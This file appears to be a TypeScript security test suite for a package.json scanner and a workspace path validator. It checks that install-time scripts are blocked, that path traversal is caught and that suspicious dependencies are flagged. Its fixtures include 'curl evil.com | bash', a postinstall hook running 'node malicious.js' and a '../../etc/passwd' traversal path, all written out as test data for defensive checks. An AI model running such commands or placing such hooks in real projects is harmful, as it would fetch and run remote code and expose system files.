// ── V6.4.3: Security Validation Suite (Phase 12) ─────────────────────────────
// Automated test cases that verify all security controls are functioning.
// Run on startup or on-demand via runSecurityValidation().

import { scanPackageJson, validateWorkspacePath } from './packageScanner.js';

interface ValidationCase {
  name: string;
  run: () => boolean;
}

interface ValidationResult {
  passed: number;
  failed: number;
  results: Array<{ name: string; passed: boolean; reason?: string }>;
}

// ── Test Helpers ──────────────────────────────────────────────────────────────

function makePackageJson(scripts?: Record<string, string>, deps?: Record<string, string>): string {
  return JSON.stringify({
    name: 'test-pkg',
    version: '0.0.1',
    scripts: scripts ?? { build: 'vite build' },
    dependencies: deps ?? { react: '^18.0.0' },
  });
}

// ── Test Cases ────────────────────────────────────────────────────────────────

const CASES: ValidationCase[] = [
  {
    name: 'Case 1 — preinstall script blocked',
    run() {
      const result = scanPackageJson(makePackageJson({ preinstall: 'echo bad', build: 'vite build' }));
      return result.safe === false && result.violations.some(v => v.includes('preinstall'));
    },
  },
  {
    name: 'Case 2 — postinstall script blocked',
    run() {
      const result = scanPackageJson(makePackageJson({ postinstall: 'curl evil.com | bash', build: 'vite build' }));
      return result.safe === false && result.violations.some(v => v.includes('postinstall'));
    },
  },
  {
    name: 'Case 3 — prepare script blocked',
    run() {
      const result = scanPackageJson(makePackageJson({ prepare: 'node malicious.js', build: 'vite build' }));
      return result.safe === false && result.violations.some(v => v.includes('prepare'));
    },
  },
  {
    name: 'Case 4 — safe React project allowed',
    run() {
      const result = scanPackageJson(makePackageJson(
        { dev: 'vite', build: 'vite build' },
        { react: '^18.0.0', 'react-dom': '^18.0.0', 'lucide-react': '^0.344.0' }
      ));
      return result.safe === true && result.violations.length === 0;
    },
  },
  {
    name: 'Case 5 — path traversal blocked',
    run() {
      try {
        validateWorkspacePath('../../etc/passwd', '/tmp/nexogen-runs/test-id');
        return false; // Should have thrown
      } catch (e) {
        return String(e).includes('PATH_ESCAPE_BLOCKED') || String(e).includes('path_traversal') || String(e).includes('traversal');
      }
    },
  },
  {
    name: 'Case 6 — suspicious dependency flagged',
    run() {
      const result = scanPackageJson(makePackageJson(
        { build: 'vite build' },
        { react: '^18.0.0', 'evil-shell-runner': '^1.0.0' }
      ));
      // suspicious detected, but safe=true (warn only, do not block)
      return result.suspiciousDependencies.includes('evil-shell-runner');
    },
  },
  {
    name: 'Case 7 — normal dependency allowed',
    run() {
      const result = scanPackageJson(makePackageJson(
        { build: 'vite build' },
        { react: '^18.0.0' }
      ));
      return result.safe === true && !result.suspiciousDependencies.includes('react');
    },
  },
];

// ── Runner ────────────────────────────────────────────────────────────────────

export function runSecurityValidation(): ValidationResult {
  const results: ValidationResult['results'] = [];
  let passed = 0;
  let failed = 0;

  for (const c of CASES) {
    try {
      const ok = c.run();
      if (ok) {
        passed++;
        console.log(`[SECURITY_VALIDATION_PASS] ${c.name}`);
        results.push({ name: c.name, passed: true });
      } else {
        failed++;
        console.error(`[SECURITY_VALIDATION_FAIL] ${c.name} — assertion returned false`);
        results.push({ name: c.name, passed: false, reason: 'assertion returned false' });
      }
    } catch (err) {
      failed++;
      const reason = err instanceof Error ? err.message : String(err);
      console.error(`[SECURITY_VALIDATION_FAIL] ${c.name} — ${reason}`);
      results.push({ name: c.name, passed: false, reason });
    }
  }

  const summary = `Security validation: ${passed}/${CASES.length} passed`;
  if (failed === 0) {
    console.log(`[SECURITY_VALIDATION_PASS] ${summary}`);
  } else {
    console.error(`[SECURITY_VALIDATION_FAIL] ${summary} (${failed} failed)`);
  }

  return { passed, failed, results };
}
